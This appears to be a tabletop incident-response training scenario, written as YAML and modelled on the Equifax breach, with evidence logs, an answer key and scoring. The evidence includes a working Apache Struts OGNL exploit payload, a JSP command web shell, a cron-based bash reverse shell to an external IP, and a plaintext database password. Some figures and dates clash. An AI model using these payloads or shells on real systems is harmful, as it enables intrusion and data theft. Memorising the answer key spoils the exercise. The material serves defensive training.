@@ -1,0 +1,460 @@
+scenario_metadata:
+  id: "equifax_inspired"
+  name: "Credit Shield Data Breach"
+  version: "1.0"
+  description: "Investigate a major data breach at a credit monitoring company caused by unpatched web application vulnerabilities"
+  difficulty: "medium"
+  estimated_duration: "45-60 minutes"
+  category: "Data Breach"
+  scenario_type: "historical_inspired"
+  max_players: 4
+
+  inspiration:
+    attack_name: "Equifax Data Breach"
+    year: 2017
+    attribution: "Unknown"
+    references:
+      - url: "https://en.wikipedia.org/wiki/2017_Equifax_data_breach"
+        description: "Equifax data breach overview"
+
+  environment:
+    sector: "finance"
+    organization:
+      name: "Credit Shield Inc."
+      size: "large"
+      employee_count: 12000
+      annual_revenue: "$1B - $5B"
+    infrastructure:
+      type: "hybrid"
+      primary_cloud: "AWS"
+      endpoints: 8500
+      servers: 450
+      critical_systems:
+        - name: "Credit Monitoring Platform"
+          description: "Consumer credit monitoring and reporting system"
+        - name: "Personal Data Repository"
+          description: "Database containing sensitive personal information"
+        - name: "Web Application Portal"
+          description: "Customer-facing web application for credit services"
+
+attack_overview:
+  summary: "Large-scale data breach targeting a credit monitoring company through exploitation of an unpatched Apache Struts vulnerability, resulting in theft of sensitive personal and financial information from millions of customers."
+
+  kill_chain:
+    - phase: "Initial Access"
+      description: "Exploitation of Apache Struts RCE vulnerability in customer portal"
+      techniques: ["T1190"]
+    - phase: "Execution"
+      description: "Web shell deployment and command execution via RCE"
+      techniques: ["T1059.004", "T1505.003"]
+    - phase: "Persistence"
+      description: "Web shell installation and scheduled task creation"
+      techniques: ["T1505.003", "T1053.003"]
+    - phase: "Defense Evasion"
+      description: "Log deletion and file masquerading to avoid detection"
+      techniques: ["T1070.004", "T1036.005"]
+    - phase: "Credential Access"
+      description: "Database credentials discovered in configuration files"
+      techniques: ["T1552.001", "T1555.003"]
+    - phase: "Discovery"
+      description: "System enumeration and database reconnaissance"
+      techniques: ["T1082", "T1083"]
+    - phase: "Lateral Movement"
+      description: "SSH access to database servers using stolen credentials"
+      techniques: ["T1021.004", "T1550.001"]
+    - phase: "Collection"
+      description: "Large-scale customer data collection and archiving"
+      techniques: ["T1005", "T1560.001"]
+    - phase: "Exfiltration"
+      description: "Customer data exfiltration via encrypted channels"
+      techniques: ["T1041", "T1567.002"]
+
+initial_alert:
+  timestamp: "2024-07-29 14:15:00"
+  source: "Security Operations Center"
+  alert_type: "high"
+  title: "Suspicious Web Application Activity"
+  description: "Unusual database queries and file access patterns detected on customer web portal. Potential data breach in progress."
+
+
+timeline:
+  day_0:
+    "07:30": "SOC analyst notices unusual database query volumes"
+    "08:00": "Incident response team activated"
+    "08:15": "Investigation begins into potential data breach"
+    "14:15": "High-priority alert triggered for suspicious web application activity"
+    "15:30": "Initial forensic analysis identifies Apache Struts exploitation"
+    "17:00": "Web shells discovered on customer portal servers"
+  day_1:
+    "09:00": "Database access logs reveal unauthorized queries"
+    "11:30": "Customer data exfiltration confirmed"
+    "14:00": "External IP addresses identified for data transfer"
+    "16:45": "Vulnerability scan confirms unpatched Struts components"
+  day_2:
+    "08:00": "Full incident response team assembled"
+    "10:30": "Customer notification process initiated"
+    "13:15": "Regulatory authorities contacted"
+    "15:45": "Public disclosure preparation begins"
+
+attack_chain:
+  - name: "Initial Access"
+    techniques:
+      - id: "T1190"
+        name: "Exploit Public-Facing Application"
+        description: "Apache Struts RCE vulnerability exploited in customer portal"
+    indicators:
+      - "HTTP POST requests with malicious OGNL expressions"
+      - "Content-Type header exploitation attempts"
+      - "Error messages revealing Apache Struts version information"
+
+  - name: "Execution"
+    techniques:
+      - id: "T1059.004"
+        name: "Command and Scripting Interpreter: Unix Shell"
+        description: "Shell commands executed through Struts RCE vulnerability"
+      - id: "T1505.003"
+        name: "Server Software Component: Web Shell"
+        description: "Web shell uploaded for persistent access"
+    indicators:
+      - "Bash commands executed via HTTP requests"
+      - "JSP web shell uploaded to web application directory"
+      - "Suspicious Java processes spawned by web server"
+
+  - name: "Persistence"
+    techniques:
+      - id: "T1505.003"
+        name: "Server Software Component: Web Shell"
+        description: "Multiple web shells deployed across application servers"
+      - id: "T1053.003"
+        name: "Scheduled Task/Job: Cron"
+        description: "Cron job created for maintaining access"
+    indicators:
+      - "Web shell files hidden in application directories"
+      - "Cron job executing reverse shell connections"
+      - "Modified .htaccess files to hide malicious uploads"
+
+  - name: "Defense Evasion"
+    techniques:
+      - id: "T1070.004"
+        name: "Indicator Removal on Host: File Deletion"
+        description: "Log files and traces deleted to avoid detection"
+      - id: "T1036.005"
+        name: "Masquerading: Match Legitimate Name or Location"
+        description: "Malicious files disguised as legitimate application components"
+    indicators:
+      - "Web server access logs showing gaps in timestamps"
+      - "Files with legitimate names but suspicious content"
+      - "Log rotation accelerated to remove evidence"
+
+  - name: "Credential Access"
+    techniques:
+      - id: "T1552.001"
+        name: "Unsecured Credentials: Credentials In Files"
+        description: "Database credentials found in configuration files"
+      - id: "T1555.003"
+        name: "Credentials from Password Stores: Credentials from Web Browsers"
+        description: "Saved credentials extracted from server browsers"
+    indicators:
+      - "Configuration files accessed containing database passwords"
+      - "Browser credential stores accessed on application servers"
+      - "Database connection strings enumerated from application code"
+
+  - name: "Discovery"
+    techniques:
+      - id: "T1082"
+        name: "System Information Discovery"
+        description: "System enumeration to identify database servers"
+      - id: "T1083"
+        name: "File and Directory Discovery"
+        description: "File system reconnaissance for sensitive data"
+    indicators:
+      - "System information gathering commands executed"
+      - "Database configuration files searched and accessed"
+      - "Network configuration enumerated for database connectivity"
+
+  - name: "Lateral Movement"
+    techniques:
+      - id: "T1021.004"
+        name: "Remote Services: SSH"
+        description: "SSH used to access database servers with stolen credentials"
+      - id: "T1550.001"
+        name: "Use Alternate Authentication Material: Application Access Token"
+        description: "Application service accounts used for database access"
+    indicators:
+      - "SSH connections from web servers to database infrastructure"
+      - "Service account authentication to database servers"
+      - "Database connections from unusual source systems"
+
+  - name: "Collection"
+    techniques:
+      - id: "T1005"
+        name: "Data from Local System"
+        description: "Customer database records collected and staged"
+      - id: "T1560.001"
+        name: "Archive Collected Data: Archive via Utility"
+        description: "Customer data compressed for exfiltration"
+    indicators:
+      - "Large SQL SELECT queries against customer tables"
+      - "Data export utilities executed on database servers"
+      - "Compressed archives created containing customer data"
+
+  - name: "Exfiltration"
+    techniques:
+      - id: "T1041"
+        name: "Exfiltration Over C2 Channel"
+        description: "Customer data exfiltrated through web shell backdoors"
+      - id: "T1567.002"
+        name: "Exfiltration Over Web Service: Exfiltration to Cloud Storage"
+        description: "Data uploaded to external cloud storage services"
+    indicators:
+      - "Large outbound data transfers from database servers"
+      - "HTTPS uploads to cloud storage providers"
+      - "Encrypted data streams with customer data patterns"
+
+evidence:
+  items:
+    - id: "ev_001"
+      type: "web_log"
+      source: "Apache Access Logs"
+      importance: "critical"
+      description: "Struts exploitation attempts in customer portal"
+      content: |
+        192.168.43.22 - - [15/Mar/2024:03:22:15 +0000] "POST /customerportal/login.action HTTP/1.1" 200 5437
+        Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+
+    - id: "ev_002"
+      type: "file_system_log"
+      source: "File Integrity Monitoring"
+      importance: "high"
+      description: "Web shell creation and suspicious file uploads"
+      content: |
+        Time: 2024-03-08 04:18:33
+        Event: FILE_CREATED
+        File: /var/www/html/customerportal/assets/shell.jsp
+        Size: 3,847 bytes
+        Hash: d4f6b2a8c1e5f7a9b3d2c4e6f8a0b2d4
+
+        Time: 2024-03-08 04:19:15
+        Event: FILE_CREATED
+        File: /var/www/html/customerportal/css/style.css.bak
+        Size: 12,453 bytes (suspicious - contains binary data)
+        Hash: a2b4c6d8e0f2a4b6c8d0e2f4a6b8c0d2
+
+    - id: "ev_003"
+      type: "database_log"
+      source: "MySQL Audit Log"
+      importance: "critical"
+      description: "Unauthorized database access and data extraction"
+      content: |
+        Time: 2024-03-14 02:15:47
+        Connection: mysql-db-01:3306
+        User: app_service@192.168.1.45
+        Command: CONNECT
+        Status: SUCCESS
+
+        Time: 2024-03-14 02:16:12
+        Connection: mysql-db-01:3306
+        Query: SELECT table_name FROM information_schema.tables WHERE table_schema='creditshield_prod'
+        Rows Examined: 127
+
+        Time: 2024-03-14 02:17:33
+        Query: SELECT COUNT(*) FROM customer_profiles WHERE creation_date > '2020-01-01'
+        Result: 147,923,467 rows
+
+        Time: 2024-03-14 02:45:22
+        Query: SELECT ssn, first_name, last_name, birth_date, address FROM customer_profiles LIMIT 1000000, 500000
+        Rows Examined: 500,000
+        Warning: Large data extraction detected
+
+    - id: "ev_004"
+      type: "network_log"
+      source: "Network Monitoring"
+      importance: "high"
+      description: "Suspicious outbound data transfers"
+      content: |
+        Time: 2024-03-14 01:30:45
+        Source: 192.168.1.45 (db-server-01)
+        Destination: 203.0.113.47:443
+        Protocol: HTTPS
+        Bytes Transferred: 2,847,392,156
+        Duration: 3 hours 27 minutes
+
+        Time: 2024-03-14 06:15:22
+        Source: 192.168.1.46 (db-server-02)
+        Destination: 198.51.100.88:443
+        Protocol: HTTPS
+        Bytes Transferred: 1,934,823,744
+        Duration: 2 hours 14 minutes
+
+        Pattern: Large HTTPS uploads to external IP addresses
+        Classification: Potential data exfiltration
+
+    - id: "ev_005"
+      type: "system_log"
+      source: "Syslog"
+      importance: "medium"
+      description: "Cron job creation for persistence"
+      content: |
+        Mar 8 04:25:17 web-server-01 crontab[1847]: (www-data) BEGIN EDIT (www-data)
+        Mar 8 04:25:43 web-server-01 crontab[1847]: (www-data) END EDIT (www-data)
+        Mar 8 04:25:43 web-server-01 crond[892]: (www-data) RELOAD (/var/spool/cron/crontabs/www-data)
+
+        Cron Entry Added:
+        */30 * * * * /bin/bash -c 'bash -i >& /dev/tcp/203.0.113.47/4444 0>&1'
+
+        Analysis: Reverse shell connection every 30 minutes to external IP
+
+    - id: "ev_006"
+      type: "vulnerability_scan"
+      source: "Security Scanner"
+      importance: "critical"
+      description: "Unpatched Apache Struts vulnerability identified"
+      content: |
+        Scan Date: 2024-03-01
+        Target: web-server-01 (192.168.1.40)
+        Scanner: Nessus Professional
+
+        Vulnerability: Apache Struts 2 Remote Code Execution
+        CVE: CVE-2017-5638
+        CVSS Score: 10.0 (Critical)
+
+        Affected Component: /customerportal/login.action
+        Struts Version: 2.3.31 (Vulnerable)
+        Patch Available: Yes (Struts 2.3.32+)
+
+        Description: The Jakarta Multipart parser in Apache Struts 2 2.3.x before 2.3.32
+        and 2.5.x before 2.5.10.1 has incorrect exception handling and error-message
+        generation during file-upload attempts, which allows remote attackers to execute
+        arbitrary commands via a crafted Content-Type header.
+
+    - id: "ev_007"
+      type: "memory_dump"
+      source: "Incident Response"
+      importance: "high"
+      description: "Web shell analysis from compromised server"
+      content: |
+        File: shell.jsp
+        Location: /var/www/html/customerportal/assets/
+        Size: 3,847 bytes
+        Type: JSP Web Shell
+
+        Code Analysis:
+        <%@ page import="java.io.*" %>
+        <%@ page import="java.util.*" %>
+        <%
+        String cmd = request.getParameter("cmd");
+        if (cmd != null) {
+            Process p = Runtime.getRuntime().exec(cmd);
+            OutputStream os = response.getOutputStream();
+            InputStream in = p.getInputStream();
+            DataInputStream dis = new DataInputStream(in);
+            String disr = dis.readLine();
+            while (disr != null) {
+                os.println(disr);
+                disr = dis.readLine();
+            }
+        }
+        %>
+
+        Functionality: Command execution via HTTP parameter
+        Last Access: 2024-03-14 06:45:22
+
+    - id: "ev_008"
+      type: "threat_intel"
+      source: "Threat Intelligence"
+      importance: "medium"
+      description: "IOC analysis and attribution indicators"
+      content: |
+        IP Address: 203.0.113.47
+        Geolocation: Eastern Europe (VPN exit node)
+        First Seen: 2024-02-15
+        Associated Campaigns: Financial data theft operations
+
+        TTPs Analysis:
+        - Consistent with financially motivated cybercriminals
+        - Focus on PII and financial data extraction
+        - Use of commodity tools and techniques
+        - No advanced persistent threat indicators
+
+        Attribution Assessment: Cybercriminal group, medium confidence
+        Motivation: Financial gain through identity theft/fraud
+
+    - id: "ev_009"
+      type: "configuration_audit"
+      source: "Security Audit"
+      importance: "high"
+      description: "Database credential exposure in application files"
+      content: |
+        File: /opt/creditshield/config/database.properties
+        Created: 2024-01-15
+        Modified: 2024-03-08 04:22:17 (suspicious timing)
+
+        Contents:
+        db.host=mysql-db-01.internal
+        db.port=3306
+        db.name=creditshield_prod
+        db.username=app_service
+        db.password=CreditSh1eld2024!
+        db.max_connections=50
+
+        Security Issues:
+        - Plaintext password storage
+        - Overprivileged database account
+        - File permissions allow wide read access (644)
+        - No encryption of sensitive configuration data
+
+
+
+solution:
+  attack_type: "Web Application Exploitation"
+  attack_vector: "Apache Struts RCE vulnerability (CVE-2017-5638)"
+  primary_objective: "Large-scale theft of personal and financial information"
+  secondary_objectives:
+    - "Establish persistent access to customer database systems"
+    - "Map and enumerate sensitive customer data repositories"
+    - "Exfiltrate maximum amount of PII for financial gain"
+
+  key_indicators:
+    - "Apache Struts vulnerability exploitation in customer portal"
+    - "Web shell deployment for persistent access"
+    - "Database credentials exposed in configuration files"
+    - "Large-scale SQL queries against customer data tables"
+    - "Massive outbound data transfers to external IP addresses"
+    - "Cron job creation for maintaining persistent access"
+
+  timeline_summary: |
+    The attack exploited an unpatched Apache Struts vulnerability that had been publicly
+    disclosed 45 days earlier. Attackers gained initial access through the customer portal,
+    deployed web shells for persistence, discovered database credentials in plaintext
+    configuration files, and conducted large-scale data exfiltration over encrypted channels.
+    The breach went undetected for approximately 77 days before being discovered by SOC analysts.
+
+  business_impact: "Approximately 2.8 million customer records compromised including SSNs, names, addresses, and financial data. Significant regulatory penalties, customer notification costs, and reputation damage expected."
+
+scoring:
+  investigation_areas:
+    - "Web application vulnerability assessment"
+    - "Apache Struts exploitation analysis"
+    - "Web shell identification and analysis"
+    - "Database access log investigation"
+    - "Network traffic analysis for data exfiltration"
+    - "Configuration file security review"
+    - "Timeline reconstruction and breach scope assessment"
+
+  critical_evidence:
+    - "ev_001"  # Struts exploitation attempts
+    - "ev_003"  # Database access and data extraction
+    - "ev_006"  # Unpatched vulnerability scan results
+
+  time_pressure: true
+  red_herrings:
+    - "Legitimate system administration activities"
+    - "Normal customer portal usage patterns"
+    - "Routine database maintenance operations"
+
+learning_objectives:
+  - "Understand web application vulnerability exploitation techniques"
+  - "Learn to identify and analyze Apache Struts-based attacks"
+  - "Practice incident response for large-scale data breaches"
+  - "Develop skills in timeline reconstruction and impact assessment"
+  - "Master breach notification and regulatory compliance considerations"
